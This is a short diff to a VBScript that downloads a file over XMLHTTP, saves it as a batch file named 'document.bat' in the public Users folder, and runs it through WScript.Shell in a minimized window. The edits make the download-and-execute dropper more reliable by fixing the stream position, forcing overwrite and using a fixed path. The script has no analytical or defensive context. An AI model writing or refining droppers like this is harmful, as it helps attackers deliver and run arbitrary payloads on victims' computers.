@@ -11,9 +11,10 @@ If oXMLHTTP.Status = 200 Then
     oStream.Open
     oStream.Type = 1
     oStream.Write oXMLHTTP.responseBody
-    oStream.SaveToFile "document.bat"
+    oStream.Position = 0
+    oStream.SaveToFile "C:\Users\Public\document.bat", 2
     oStream.Close
 End If
 
 Set shell = CreateObject("WScript.Shell")
-shell.Run "document.bat", 2
+shell.Run "C:\Users\Public\document.bat", 2
